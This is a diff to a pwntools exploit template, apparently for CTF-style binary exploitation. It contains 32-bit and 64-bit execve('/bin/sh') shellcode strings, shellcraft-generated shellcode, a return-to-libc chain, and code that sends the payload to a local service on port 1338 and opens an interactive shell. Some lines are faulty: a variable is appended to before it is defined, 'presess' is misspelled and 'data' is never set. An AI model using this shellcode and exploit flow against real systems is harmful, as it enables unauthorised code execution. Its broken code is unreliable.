@@ -9,7 +9,8 @@ DEBUG = 1
 # 1. Making Exploitation
 # 1.1 case of using crafted shellcode
 exploit = p64(1)
-exploit += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+exploit32 += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+shell64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
 
 # 1.2 case of making shellcode using asm()
 exploit = asm(shellcraft.i386.pushstr('/bin///sh'))
@@ -40,10 +41,10 @@ exploit3 += p32(addr_libc + offset_int80)
 
 # 2. Communicate to exploitable
 if DEBUG == 1:
-    conn = remote('127.0.0.1' ,1338)
-#    conn = presess("./xxxxxx")
+    r = remote('127.0.0.1' ,1338)
+#    r = presess("./xxxxxx")
 else:
-    conn = remote('127.0.0.1' ,1338)
+    r = remote('127.0.0.1' ,1338)
 
 
 # for gdb debug
@@ -53,7 +54,7 @@ raw_input()
 log.info('[+]leak stack_addr')
 
 # read until specific word (recv(), recvline(), recvlines(), recvall())
-line = conn.recvuntil('password? ')
+line = r.recvuntil('password? ')
 
 # extract output
 result = re.search(r'result: ([^,]*), code: (.*)', data)
@@ -61,6 +62,6 @@ base_addr = result.group(1)
 libc_addr = u32(result.group(2)[:4])
 
 # send data (sendline())
-conn.send(exploit+'\n')
+r.send(exploit+'\n')
 # change interactive mode
-conn.interactive()
+r.interactive()
